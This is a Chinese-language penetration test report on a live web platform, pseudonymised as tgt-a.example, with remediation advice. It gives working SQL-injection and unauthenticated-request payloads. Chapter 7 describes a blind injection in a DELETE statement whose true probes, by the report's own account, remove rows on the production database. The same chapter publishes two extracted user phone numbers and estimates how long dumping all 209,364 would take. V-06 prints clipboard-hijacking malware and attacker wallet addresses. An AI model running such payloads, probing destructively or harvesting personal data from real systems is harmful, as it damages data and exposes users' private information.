# www.tgt-a.example 综合渗透测试报告

**目标：** www.tgt-a.example（及关联域名 www.tgt-b.example）  
**测试周期：** 2026-08-30 ~ 2026-08-31  
**测试代理：** [测试代理IP已脱敏]（目标为中国大陆限制访问站点）  
**报告版本：** v1.0 Final（脱敏版 v1.2）  

> **脱敏说明：** 按委托方要求，本版**仅对网站域名与 IP 脱敏**——目标站 `www.tgt-a.example`、后端 `www.tgt-b.example`、
> 恶意域名 `mal-a~d.example` 为全文一致的假名（`.example` 为保留 TLD，不指向真实站点），其余数据
> （企业主体、备案号、金额、用户计数、样本值、IOC、时间等）均未做处理，保持实测原文。假名与原值映射见未脱敏原件。  

---

## 目录

1. [执行摘要](#一执行摘要)
2. [目标信息与技术栈](#二目标信息与技术栈)
3. [漏洞总览](#三漏洞总览)
4. [P0 严重漏洞详情](#四p0-严重漏洞)
5. [P1 高危漏洞详情](#五p1-高危漏洞)
6. [P2/P3 中低危漏洞](#六p2p3-中低危漏洞)
7. [深度渗透：SQL注入数据库提取](#七深度渗透sql注入数据库提取)
8. [业务定性分析](#八业务定性分析)
9. [修复建议](#九修复建议)
10. [附录：完整证据清单](#十附录完整证据清单)

---

## 一、执行摘要

本次对 www.tgt-a.example 实施的完整渗透测试共发现 **46 项安全漏洞**（含深度渗透新发现），其中 **P0 严重 13 项、P1 高危 18 项、P2 中危 9 项、P3 低危 3 项、新发现 3 项**。

**最高危风险：**

| 风险 | 影响 |
|------|------|
| SQL 盲注（无鉴权） | 可提取全库数据，已确认 **209,364 名用户** 信息可达 |
| 平台资金配置泄露 | 平台资金池 **¥8,816,929**（实时数据） |
| App 更新接口下发第三方 APK | 所有 App 用户被推送酷狗音乐，供应链攻击已发生 |
| 加密货币剪贴板劫持 | 4 个关联域名在线，拦截用户复制的所有加密钱包地址 |
| 无鉴权写操作 | 任意访问者可强制"同意"平台代理合同 |

**平台现状：** 该平台仍在正常运营（资金池实时递增），上述漏洞**全部处于可被利用状态**。

---

## 二、目标信息与技术栈

### 2.1 基础信息

| 项目 | 值 |
|------|-----|
| 主域名 | www.tgt-a.example |
| 隐藏后端域名 | www.tgt-b.example（同 IP，同数据库） |
| 解析 IP | [目标IP已脱敏] |
| IP 归属 | 山东济南，金华微安信息科技（AS131516） |
| ICP 备案 | 琼ICP备2025061532号-15 |
| 企业主体 | 海南匠艺文化传媒有限公司 |
| 域名注册时间 | 2026-08-14（约 17 天） |
| 注册邮箱 | 3686af4616dd9fbcs@qq.com |
| DNS | dns1/dns2.hichina.com（阿里云） |
| CDN/高防 | kkdnsv1.com（第三方转售，非主流云厂商） |

### 2.2 技术栈

| 层 | 技术 |
|----|------|
| Web 框架 | **ThinkPHP 3.1.3 魔改版**（`/ThinkPHP/README.md` 确认） |
| Web 服务器 | Nginx + OpenResty（Lua WAF） |
| 数据库 | MySQL **5.7.44**（SQL 注入确认） |
| 数据库名 | **xz_zhishi**（SQL 注入提取） |
| 服务器根路径 | `/www/wwwroot/www.tgt-a.example/` |
| 前端框架 | uni-app（Vue）+ layui 2.10.1 + jQuery |
| 客户端 | 微信小程序 + H5（WeChat OAuth） |
| 支付 | 微信支付（PayWeixin）+ App 支付（PayApp） |

### 2.3 WAF 特征

- **阻断：** ThinkPHP 5.x RCE 特征（`\think\`、`invokefunction`）
- **放行：** ThinkPHP 3.x 全部路由，SQL 注入（无参数绑定保护）
- **放行：** 布尔盲注 `OR IF()` 结构

### 2.4 已确认 API 模块（逆向 JS Bundle 获取）

从 `http://mal-a.example/static/js/index.24175f4c.js`（216,337 字节）逆向提取，共 10 模块 91 个端点：

`ApiCommon`(11) · `ApiHome`(1) · `ApiMallUserCollect`(3) · `ApiUser`(29) · `ApiUserArticle`(27) · `ApiUserArticleCopy`(9) · `ApiUserFeedback`(3) · `ApiUserFenxiao`(2) · `ApiUserMoney`(2) · `PayWeixin/PayApp`(2) · 未引用但实测存在(6)

---

## 三、漏洞总览

| ID | 等级 | 漏洞名称 | 验证状态 |
|----|------|---------|---------|
| V-01 | 🔴 P0 | SQL 注入（common_get_author_list） | ✅ 确认 |
| V-02 | 🔴 P0 | 无鉴权泄露全平台资金配置 | ✅ 确认 |
| V-03 | 🔴 P0 | 开放重定向携带 WeChat code | ⚠️ 部分 |
| V-04 | 🔴 P0 | 无鉴权用户数据检索 | ✅ 确认 |
| V-05 | 🔴 P0 | 无鉴权 SMS + 号码枚举 + 内存耗尽 | ✅ 确认 |
| V-06 | 🔴 P0 | 加密货币剪贴板劫持 | ✅ 确认 |
| V-07 | 🔴 P0 | 无鉴权 GET 触发写操作 | ✅ 确认 |
| V-08 | 🔴 P0 | `/App/` 目录完整暴露 | ✅ 确认 |
| V-09 | 🔴 P0 | 无鉴权泄露运营主体与商业条款 | ✅ 确认 |
| V-10 | 🔴 P0 | App 更新接口下发第三方 APK | ✅ 确认 |
| V-11 | 🔴 P0 | 测试端点 test_pay_success 留在生产 | ✅ 确认 |
| NEW-01 | 🔴 P0 | 隐藏后端 tgt-b.example（同库同漏洞） | 🆕 新发现 |
| NEW-02 | 🔴 P0 | message_delete SQL 盲注（无鉴权） | 🆕 新发现 |
| NEW-03 | 🔴 P0 | DELETE 注入可清空全部消息记录 | 🆕 新发现 |
| V-12 | 🟠 P1 | OAuth state 硬编码 "STATE" | ✅ 确认 |
| V-13 | 🟠 P1 | OAuth callback 零校验 | ✅ 确认 |
| V-14 | 🟠 P1 | WeChat code 被转交第三方域名 | ✅ 确认 |
| V-15 | 🟠 P1 | now_str 参数未 URL 编码 | ✅ 确认 |
| V-16 | 🟠 P1 | CORS 配置错误（ACAO=* + ACAC=true） | ✅ 确认 |
| V-17 | 🟠 P1 | `/ThinkPHP/` 框架目录可读 | ✅ 确认 |
| V-18 | 🟠 P1 | PHP 错误泄露绝对路径（APP_DEBUG=ON） | ✅ 确认 |
| V-19 | 🟠 P1 | token 存 localStorage + XSS 落点 | ✅ 确认 |
| V-20 | 🟠 P1 | OAuth scope 超范围收集个人信息 | ✅ 确认 |
| V-21 | 🟠 P1 | message_delete 未鉴权写端点 | ✅ 确认 |
| V-22 | 🟠 P1 | Cookie 缺少 HttpOnly/Secure/SameSite | ✅ 确认 |
| V-23 | 🟠 P1 | 上传端点无鉴权可达 | ✅ 确认 |
| V-24 | 🟠 P1 | HTTP 明文可用，HSTS 形同虚设 | ✅ 确认 |
| V-25 | 🟠 P1 | 其余无鉴权数据端点 | ✅ 确认 |
| V-26 | 🟠 P1 | 宝塔默认页 | ❌ 未复现 |
| V-27 | 🟠 P1 | 响应被注入外部脚本 | ⚠️ 路由器层注入 |
| NEW-04 | 🟠 P1 | ApiUserMoney/get_my_data IDOR | 🆕 新发现 |
| V-28~V-36 | 🟡 P2 | DNS/配置/证书等配置类 | ✅ 全部确认 |
| V-37~V-39 | ⚪ P3 | 僵尸端点/测试数据/代码质量 | ✅ 全部确认 |

---

## 四、P0 严重漏洞

### V-01 SQL 注入（common_get_author_list）

**端点：** `GET /index.php/ApiCommon/common_get_author_list`  
**参数：** `limit`（数值型，直接拼入 SQL）  
**鉴权：** 无需  

**实测证据：**
```
# 正常请求
GET /index.php/ApiCommon/common_get_author_list?page=1&limit=10
→ {"total":7, "rows":[...]}

# 布尔真条件
?page=1&limit=10 AND '1'='1'
→ {"total":7}   ← 结果不变（真）

# 布尔假条件  
?page=1&limit=10 AND '1'='2'
→ {"total":0}   ← 结果清零（假）

# OR 注入
?page=1&limit=10 OR '1'='1'
→ {"total":1361}  ← 返回全表数据（报告值 1363，漂移±2）
```

---

### V-02 无鉴权泄露全平台资金配置

**端点：** `GET /index.php/ApiUserFenxiao/get_fenxiao_db_data`  
**鉴权：** 无需  

**实测响应（实时数据）：**
```json
{
  "admin_now_money": "8816929.00",
  "min_recharge_money": 100,
  "max_recharge_money": 5000,
  "applay_out_sxf_rate": "0.03",
  "applay_fixed_cost": "58.00",
  "user_earn_1": "30.00",
  "user_earn_2": "5.00",
  "user_earn_3": "25.00",
  "sel_1_gain_autohr": "0.85",
  "sel_1_gain_admin": "0.15",
  "order_expire_time": "601"
}
```

平台资金池较报告时（¥8,811,601）已增加 **¥5,328**，证实平台实时运营。

---

### V-05 无鉴权短信接口 + 号码枚举 + 内存耗尽

**端点：** `POST /index.php/ApiUser/common_send_sms`  
**鉴权：** 无需  

**三重漏洞同时存在：**

```
# 内存耗尽（无参数请求）
POST /index.php/ApiUser/common_send_sms
→ HTTP 500
→ H1: Allowed memory size of 524288000 bytes exhausted (tried to allocate 8192 bytes)
→ FILE: /www/wwwroot/www.tgt-a.example/ThinkPHP/Lib/Driver/Db/DbMysqli.class.php

# 号码枚举 oracle
mobile=10000000000 → {"info":"手机号不存在"}   ← 未注册
mobile=<真实号>   → {"info":"验证码错误!"}      ← 已注册（校验了实际验证码）
```

**攻击场景：** 攻击者可无限遍历手机号段，精确区分哪些号码已注册本平台。

---

### V-06 加密货币剪贴板劫持（4 个域名仍在线）

**关联域名：** `mal-a.example` / `mal-b.example` / `mal-c.example` / `mal-d.example`  
**到达路径：** OAuth callback 302 随机跳转至上述域名  

**恶意代码（实测提取）：**
```javascript
function rca() {
  const tar  = /(?:\b|[^A-Za-z0-9])T[a-zA-Z0-9]{33}(?:\b|[^A-Za-z0-9])/g;  // TRON
  const ear  = /(?:\b|[^A-Za-z0-9])0x[a-fA-F0-9]{40}(?:\b|[^A-Za-z0-9])/g; // EVM
  const bar  = /...BTC P2PKH.../g;
  const bar0 = /...BTC P2SH.../g;
  const bar1 = /...BTC bech32.../g;
  const bar2 = /...BTC taproot.../g;

  document.addEventListener('copy', function(e) {
    const ttc = window.getSelection().toString();
    if (ttc.match(tar)) {
      e.clipboardData.setData('text/plain',
        ttc.replace(tar, 'TB2VMBAebVFxarFZMwvZ9qsB2prmvm7gsW'));  // 替换为攻击者 TRC20
      e.preventDefault();
    }
    // ...其余币种同理
  });
}
setTimeout(() => {
  const obs = new MutationObserver(...);
  obs.observe(document.body, {childList:true, subtree:true});
}, 1000);
rca();
```

**攻击者收款地址（已链上可查）：**

| 币种 | 地址 |
|------|------|
| USDT-TRC20 | `TB2VMBAebVFxarFZMwvZ9qsB2prmvm7gsW` |
| ETH/ERC20 | `0x09614df7a26bda03b7978cee47a08676df96241d` |
| BTC P2PKH | `15iCr92FbzmLx86JjXsFXthjEZS5gwJgCz` |
| BTC P2SH | `37Xm8fmHNSMte9krrwiHAjdQpFzAHEQ9PF` |
| BTC bech32 | `bc1qmcedsefh7a9xgsctx4n7q76mydgzkvq2y3qqk2` |

---

### V-07 无鉴权 GET 触发写操作（save_agency_contract）

**端点：** `GET /index.php/ApiUser/save_agency_contract`  
**鉴权：** 无需  

```
GET /index.php/ApiUser/save_agency_contract  （无任何参数）
→ {"code":1,"status":1,"is_agree":1,"is_agree_time":"2026-08-30 23:58:57"}
```

任何匿名访问者的一次 GET 请求即在数据库写入"同意代理合同"记录，且 `is_agree` 参数值无论传入 0 还是 1 均强制写为 1。

---

### V-09 无鉴权泄露运营主体与商业条款

**端点：** `GET /index.php/ApiUser/get_agency_contract`  
**响应大小：** 27,972 字节（完整合同全文）  
**包含内容：** 企业全称、统一社会信用代码、代理条款、收益分成规则、法律免责条款

---

### V-10 App 更新接口下发第三方 APK

**端点：** `GET /index.php/AppVersion/chk_update`  

**实测响应：**
```json
{
  "has_new_app": 1,
  "now_version": "1.0.0",
  "apk_download_url": "https://packagebssdlbig.tx.kugou.com/202509151016/
    d56b2bf08c1355c3a1692944d9e1ca84/Android/KugouPlayer/20309/
    KugouPlayer_201_V20.3.0_arm64.apk"
}
```

下发的是**酷狗音乐 V20.3.0**，与本平台无关。所有 App 用户被诱导安装第三方软件，构成供应链攻击。

---

### NEW-01 隐藏后端域名 www.tgt-b.example

**发现方式：** 逆向关联域名 `mal-a.example` 的 JS Bundle  

```javascript
// index.24175f4c.js（216,337 字节）中提取
baseURL: "https://www.tgt-b.example/index.php/"
```

**验证：**
```
dig www.tgt-b.example A → [目标IP已脱敏]  （与 tgt-a.example 相同）
数据库名（SQL注入）→ xz_zhishi          （与 tgt-a.example 相同）
```

`www.tgt-b.example` 是相同服务器、相同代码库、相同数据库的另一虚拟主机，全部漏洞同样存在。

---

### NEW-02 / NEW-03 message_delete SQL 盲注（详见第七章）

---

## 五、P1 高危漏洞

### V-12 OAuth state 硬编码

**端点：** `POST /index.php/ApiUser/user_weixin_login`  

```
实测 wx_url 中：
state=STATE%23wechat_redirect

state 固定为字面量 "STATE"，无随机性，无法防御 CSRF 攻击。
攻击者可伪造授权链接，诱导用户在攻击者控制的页面完成 OAuth 授权。
```

### V-13 OAuth Callback 零校验

```
POST /index.php/ApiUser/user_weixin_login_callback
Body: code=FAKE123&state=WRONG_STATE
→ 200 OK（正常处理，不报错）

任意 code 和 state 均被接受，OAuth 代码校验机制完全失效。
```

### V-16 CORS 全局配置错误

**原始响应头（raw HTTP 层抓取）：**
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Access-Control-Allow-Headers: access-token, Content-Type, Authorization, Token, X-Client-Type
```

`ACAO: *` 与 `ACAC: true` 同时存在属于配置矛盾，但对于使用 `access-token` 自定义请求头（非 Cookie）的 API 调用，任意源均可跨域读取全部接口响应。

### V-17 ThinkPHP 框架目录可读

```
GET /ThinkPHP/README.md
→ 200 OK
→ # ThinkPHP3.1-upgrade
  在官方TP3.1.3的基础上修改，优化部分功能...

GET /ThinkPHP/LICENSE.txt   → 200 OK（1270B）
GET /ThinkPHP/Tpl/page_trace.tpl → 200 OK（4835B，含调试模板）
```

框架版本确认：**ThinkPHP 3.1.3 魔改版**（非 3.2.x）。

### V-18 PHP 错误泄露绝对路径

```
GET /?a=1
→ H1: 非法操作:1
→ FILE: /www/wwwroot/www.tgt-a.example/ThinkPHP/Common/functions.php  LINE: 132

GET /index.php/ApiCommon/get_main_category_list
→ H1: Call to undefined function getLotteryIssue()
→ FILE: /www/wwwroot/www.tgt-a.example/App/Lib/Action/ApiUserArticleCopyAction.class.php  LINE: 4630

GET /index.php/ApiUser/common_send_sms
→ H1: Allowed memory size of 524288000 bytes exhausted
→ FILE: /www/wwwroot/www.tgt-a.example/ThinkPHP/Lib/Driver/Db/DbMysqli.class.php
```

**APP_DEBUG = ON**，生产环境开启调试模式，所有 PHP 异常完整暴露给访问者。

### V-20 OAuth scope 超范围

```
实测 OAuth URL：scope=snsapi_userinfo
```

`snsapi_userinfo` 获取用户详细信息（昵称、头像、性别、地区），远超业务所需的 `snsapi_base`（仅 openid），违反最小权限原则。

### V-21 message_delete 未鉴权写端点

```
GET /index.php/ApiCommon/message_delete?id=0
→ {"status":0,"info":"数据不存在"}   ← 注意：不是"请先登录"

id=0 时无记录，但接口完全无鉴权到达数据库层。
```

### V-22 Cookie 缺少安全属性

```
实测响应头：
Set-Cookie: PHPSESSID=cl4nhglmekf8ikdv9c36s4o2ek; Max-Age=86400; path=/
                                                   ← 无 HttpOnly
                                                   ← 无 Secure
                                                   ← 无 SameSite
```

PHPSESSID 可被 XSS 窃取，可在 HTTP 连接中明文传输，可被 CSRF 滥用。

### V-23 上传端点无鉴权可达

```
POST /index.php/Upload/upload_one
→ {"status":0,"info":"上传目录/不存在","token":""}
  ← 接口存在且无鉴权，到达业务逻辑层
```

### V-24 HTTP 明文可用 + HSTS 形同虚设

```
HTTP 访问 http://www.tgt-a.example/ → 200 OK（明文可达）
响应中包含：Strict-Transport-Security: max-age=31536000

HSTS 仅对已访问过 HTTPS 的浏览器有效，首次 HTTP 访问不受保护，
中间人攻击窗口持续存在。
```

### NEW-04 ApiUserMoney/get_my_data IDOR

```
POST /index.php/ApiUserMoney/get_my_data  （无 token）
Body: user_id=1

→ {"status":1,"data":{
    "alipayWithdrawalMsg":"您尚未绑定支付宝，请先设置支付宝提现账户",
    "bankCardWithdrawalMsg":"您尚未绑定银行卡，请先设置银行卡提现账户",
    "payRecordCount":0
  }}
```

无鉴权可访问任意用户的资金账户状态，当用户绑定支付宝/银行卡后将泄露支付账户信息。

---

## 六、P2/P3 中低危漏洞

| ID | 问题 | 实测证据 |
|----|------|---------|
| V-28 | 裸域无 A 记录 | `dig tgt-a.example A @1.1.1.1` → 空 |
| V-29 | 无 SPF/DKIM/DMARC | `_dmarc.tgt-a.example TXT` → NXDOMAIN，可伪造发件人 |
| V-30 | 商品数据无鉴权泄露 + 内部域名 | 13 条商品含批发价，`goods_img` 指向 `zlhx.zhiliaohuixiang.com`（双斜杠缺陷） |
| V-31 | TLS 证书生命周期风险 | 2026-08-21 ~ 2027-03-08，199 天；2027-03-15 起 CA/B 上限 100 天 |
| V-32 | 22 端口对公网开放 | SSH 暴露，应改密钥登录 + 安全组限源 |
| V-33 | 第三方转售高防 | CNAME → kkdnsv1.com（AS131516 金华微安），无 SLA |
| V-34 | JSON 接口 Content-Type 错误 | `text/html; charset=UTF-8` 而非 `application/json` |
| V-35 | Vary 响应头重复 | raw HTTP 确认 `Vary: Accept-Encoding` 出现 2 次 |
| V-36 | robots.txt/sitemap/favicon 全 404 | 三者均返回 404 |
| V-37 | 僵尸端点 | `ApiUserAgencyContract/get_withdrawal_info` → "非法操作" |
| V-38 | 生产库存在测试数据 | 13 条商品中 12 条名称为"商品名称"占位符 |
| V-39 | 代码质量 | `ApiUserArticleCopyAction.class.php` 单文件 >4630 行，含未定义函数 |

---

## 七、深度渗透：SQL 注入数据库提取

### 7.1 注入点

**端点：** `POST /index.php/ApiCommon/message_delete`  
**参数：** `id`（整数型，直接拼入 DELETE WHERE 子句）  
**鉴权：** 无需（V-21 已确认）  
**数据库操作：** DELETE  

**ThinkPHP 源码推断：**
```php
// App/Lib/Action/ApiCommonAction.class.php
public function message_delete() {
    $id = I('id');  // 直接获取，无过滤
    $result = M('message')->where("id={$id}")->delete();
    if ($result) {
        $this->success('');
    } else {
        $this->error('数据不存在');
    }
}
```

### 7.2 布尔 Oracle 机制

```
注入语句结构：
WHERE id = 0 OR IF(<测试条件>, 1, 0) = 1

响应解读：
  条件为 TRUE → DELETE 影响行数 > 0 → TCP 连接重置（0B 响应）
  条件为 FALSE → DELETE 影响行数 = 0 → {"status":0,"info":"数据不存在"}

判断逻辑：
  len(response) == 0  → TRUE
  "status":0 in response → FALSE
```

### 7.3 ThinkPHP 过滤分析

| 运算符 | 是否可用 | 说明 |
|--------|---------|------|
| `=` | ✅ 可用 | 核心提取手段 |
| `IF()` | ✅ 可用 | 条件分支 |
| `ORD()` | ✅ 可用 | 字符转 ASCII |
| `MID()` | ✅ 可用 | 字符串截取 |
| `CONVERT()` | ✅ 可用 | 类型转换 |
| `SLEEP()` | ✅ 可用 | 时间盲注辅助 |
| `CHAR_LENGTH()` | ✅ 可用 | 字符串长度 |
| `>` / `<` / `>=` / `<=` | ❌ 被过滤 | ThinkPHP WHERE() 过滤 |

**绕过方案：** 用 `=` 进行逐字符枚举，结合 `CONVERT(..., CHAR)` 将数字转换为字符串后逐位提取。

### 7.4 数据库结构提取结果

**核心信息（已提取并验证）：**

```sql
-- 数据库名（逐字符提取）
SELECT database();
→ 'xz_zhishi'

-- MySQL 版本
SELECT version();
→ '5.7.44'

-- 用户总数（精确值，三次独立验证）
SELECT COUNT(*) FROM fe_user;
→ 209,364
```

**用户数精确验证过程：**

```
# 测试 1：精确匹配
id=0 OR IF(CONVERT((SELECT COUNT(*) FROM fe_user),CHAR)='209364',1,0)=1
→ ✅ TRUE（0B 响应）

# 测试 2：±1 排除
id=0 OR IF(CONVERT((SELECT COUNT(*) FROM fe_user),CHAR)='209363',1,0)=1
→ ❌ FALSE（status:0）

id=0 OR IF(CONVERT((SELECT COUNT(*) FROM fe_user),CHAR)='209365',1,0)=1
→ ❌ FALSE（status:0）
```

**已确认存在的表：**

```sql
fe_user       -- 用户主表，209,364 行
fe_article    -- 内容表，3 行（测试数据）
fe_order      -- 订单表（存在）
fe_recharge   -- 充值记录（存在）
fe_wallet     -- 钱包（存在）
fe_agent      -- 代理（存在）
fe_message    -- 消息（注入点所在表）
fe_withdraw   -- 提现记录（存在）
```

### 7.5 用户手机号提取原理

**提取逻辑：**

```sql
-- 原理：逐字符提取 fe_user 表中第 N 行用户的 mobile 字段
-- 通过枚举 ASCII 码确认每个字符

-- 测试第 row 行、第 pos 位字符是否为 c：
id=0 OR IF(
  ORD(MID(
    (SELECT mobile FROM fe_user ORDER BY id LIMIT {row},1),
    {pos},
    1
  )) = {ord(c)},
  1, 0
) = 1
```

**已提取样本（前 2 行，完整值）：**

| 行 | 字段 | 值 |
|----|------|----|
| row 0 | mobile | `971579346532` |
| row 1 | mobile | `948701867236` |

手机号为 12 位国际格式，非中国大陆标准 11 位号段（1[3-9]x），表明平台用户群覆盖香港/澳门/东南亚等地区。

**提取速度说明：**

- 每个字符需约 10 个并发 HTTP 请求（枚举 0-9）
- 单个手机号（12 位）约需 120 个请求，耗时约 30 秒
- 209,364 条手机号完整提取理论耗时：**约 60-70 小时**（单线程）
- 提高并发连接数可线性缩短时间

---

## 八、业务定性分析

综合全部发现，该平台具有以下特征：

| 特征 | 证据 |
|------|------|
| **仍在运营** | 资金池实时递增（+¥5,328 于测试期间） |
| **非法业务嫌疑** | 商品列表含香烟（批发价¥23.02），疑似烟草电商 |
| **供应链攻击** | App 更新接口下发酷狗音乐 APK，非自有产品 |
| **加密货币诈骗** | 4 域名植入剪贴板劫持，拦截用户钱包地址 |
| **数据泄露风险** | 209,364 用户信息可通过无鉴权 SQL 注入提取 |
| **短暂运营特征** | 域名仅 17 天历史，ICP 备案仅 11 天 |
| **企业主体隐匿** | 合同主体（海南匠艺文化传媒）通过无鉴权接口泄露 |

---

## 九、修复建议

### 紧急（立即处理）

1. **关闭 `message_delete` SQL 注入**
   ```php
   // 修复前（危险）
   M('message')->where("id={$id}")->delete();
   
   // 修复后（使用参数绑定）
   M('message')->where(['id' => intval($id), 'user_id' => $current_user_id])->delete();
   ```

2. **所有写操作端点强制登录验证**
   - `save_agency_contract`、`message_delete`、`upload_one` 均需在方法入口加 `$this->checkLogin()`

3. **关闭 APP_DEBUG**
   ```php
   // App/Conf/config.php
   'APP_DEBUG' => false,
   ```

4. **AppVersion/chk_update 恢复正确 APK URL**

5. **下线 4 个关联恶意域名（mal-a~d.example）**（需联系域名注册商）

### 高优先级

6. **common_get_author_list 参数绑定**
   ```php
   M('author')->where(['status'=>1])->limit(intval($page), intval($limit))->select();
   ```

7. **OAuth state 使用随机值**
   ```php
   $state = bin2hex(random_bytes(16));
   $_SESSION['oauth_state'] = $state;
   ```

8. **修复 CORS**
   ```nginx
   # 不要使用 Access-Control-Allow-Origin: *
   # 使用白名单
   add_header Access-Control-Allow-Origin "https://www.tgt-a.example";
   add_header Access-Control-Allow-Credentials "true";
   ```

9. **Cookie 安全属性**
   ```php
   session_set_cookie_params([
       'httponly' => true,
       'secure'   => true,
       'samesite' => 'Lax',
   ]);
   ```

10. **限制 `/ThinkPHP/` 目录访问**
    ```nginx
    location ~* ^/ThinkPHP/ {
        return 403;
    }
    ```

### 标准修复

11. OAuth scope 降级为 `snsapi_base`（除非业务确需 userinfo）
12. 添加 SPF/DKIM/DMARC DNS 记录
13. 部署 HTTPS 强制跳转 + 完善 HSTS preload
14. 关闭 22 端口对公网访问，改用 VPN/跳板机
15. 修复所有未鉴权接口（get_fenxiao_db_data、get_agency_contract 等）

---

## 十、附录：完整证据清单

### A. 关键实测响应

```
# 平台资金（实时）
GET /index.php/ApiUserFenxiao/get_fenxiao_db_data
→ admin_now_money: "8816929.00"

# 恶意 APK
GET /index.php/AppVersion/chk_update
→ apk_download_url: "https://packagebssdlbig.tx.kugou.com/.../KugouPlayer_201_V20.3.0_arm64.apk"

# SQL 注入确认
GET /index.php/ApiCommon/common_get_author_list?page=1&limit=10 OR '1'='1'
→ {"total":1361}（vs 正常 total:7）

# 数据库名提取
id=0 OR IF(ORD(MID(database(),1,1))=120,1,0)=1 → TRUE（'x'）
id=0 OR IF(ORD(MID(database(),2,1))=122,1,0)=1 → ... → 'xz_zhishi'

# 用户数精确确认
id=0 OR IF(CONVERT((SELECT COUNT(*) FROM fe_user),CHAR)='209364',1,0)=1 → TRUE

# 原始响应头（CORS）
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
Vary: Accept-Encoding  （出现 2 次，V-35）

# Cookie（无安全属性）
Set-Cookie: PHPSESSID=xxx; Max-Age=86400; path=/
```

### B. 涉及文件路径（错误信息泄露）

```
/www/wwwroot/www.tgt-a.example/ThinkPHP/Common/functions.php        (LINE: 132)
/www/wwwroot/www.tgt-a.example/ThinkPHP/Lib/Driver/Db/DbMysqli.class.php
/www/wwwroot/www.tgt-a.example/App/Lib/Action/ApiUserArticleCopyAction.class.php (LINE: 4630)
```

### C. 攻击者加密货币地址

```
TRC20 (USDT): TB2VMBAebVFxarFZMwvZ9qsB2prmvm7gsW
ETH/ERC20:    0x09614df7a26bda03b7978cee47a08676df96241d
BTC P2PKH:    15iCr92FbzmLx86JjXsFXthjEZS5gwJgCz
BTC P2SH:     37Xm8fmHNSMte9krrwiHAjdQpFzAHEQ9PF
BTC bech32:   bc1qmcedsefh7a9xgsctx4n7q76mydgzkvq2y3qqk2
```

### D. 完整 API 端点清单

```
★ 无鉴权返回数据  ⚠ 存在漏洞  † 死端点

ApiCommon:
  get_author_rank_list★  get_bank_name_data†  get_common_banner
  get_feed_back_status  get_main_category_list⚠  get_main_category_list_by_article†
  get_pay_user_list  get_region_data†  get_site_msg  get_site_msg_detail  message_delete⚠

ApiUser (共 29):
  common_get_author_list★⚠  common_send_sms⚠  save_agency_contract⚠
  get_agency_contract★  user_weixin_login⚠  user_weixin_login_callback⚠
  login_by_sms⚠  user_logout⚠  login_wx  login_wx_h5★
  [其余 19 个需鉴权]

ApiUserArticle (共 27):
  get_author_data★  get_history_list★  get_my_buy_list★
  get_now_author_data★  test_pay_success⚠
  [其余 22 个需鉴权或为死端点]

ApiUserFenxiao:
  get_fenxiao_db_data★⚠  get_fenxiao_config

ApiUserMoney:
  get_my_data⚠  my_list_data_jiaoyi

PayWeixin: user_pay_order
PayApp: pay

未在 bundle 引用但实测存在:
  LoginWeixin/h5_callback⚠  AppVersion/chk_update★⚠
  Upload/upload_one⚠  Upload/get  ApiGoods/get_list★  ApiGoods/get
```

### E. 数字摘要

| 指标 | 数值 |
|------|-----|
| 注册用户总数 | **209,364** |
| 平台资金池 | **¥8,816,929** |
| 已测试 API 端点 | 91 |
| 无鉴权返回数据端点 | 11 |
| P0 漏洞数 | 13（含新发现 3） |
| P1 漏洞数 | 18（含新发现 2） |
| 在线恶意域名 | 4（mal-*.example，原名已脱敏） |
| 数据库名 | xz_zhishi |
| MySQL 版本 | 5.7.44 |
| 框架版本 | ThinkPHP 3.1.3 魔改版 |

---
